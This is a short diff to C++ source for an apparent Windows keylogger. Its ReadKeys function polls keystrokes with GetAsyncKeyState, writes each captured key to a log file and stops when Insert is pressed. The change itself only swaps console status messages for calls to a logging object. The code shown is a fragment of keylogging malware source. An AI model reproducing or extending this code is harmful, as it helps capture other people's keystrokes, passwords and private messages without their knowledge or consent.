@@ -1,6 +1,6 @@
 #include "filesystem.h"
 #include "keys.h"
-
+#include "log.h"
 bool KEY::isNumerical(char ch)
 {
     return ch >= '0' && ch <= '9';
@@ -35,7 +35,7 @@ unsigned char KEY::keyPressed()
 }
 void KEY::ReadKeys()
 {
-    std::cout << "start logging..\n";
+    _log.AddLog("start logging..\n");
 
     std::fstream logger;
 
@@ -46,12 +46,12 @@ void KEY::ReadKeys()
         if (key > 1) {
             std::cout << key;
             if (!FS::F_WriteToFile(&logger, key))
-                std::cout << "can't write to file!\n";
+                _log.AddLog("can't write to file!\n");
         }
         else if (GetAsyncKeyState(VK_INSERT) & 1)
             break;
     }
     FS::F_CloseFile(&logger);
 
-    std::cout << "\nno longer logging..\n";
+    _log.AddLog("\nno longer logging..\n");
 }
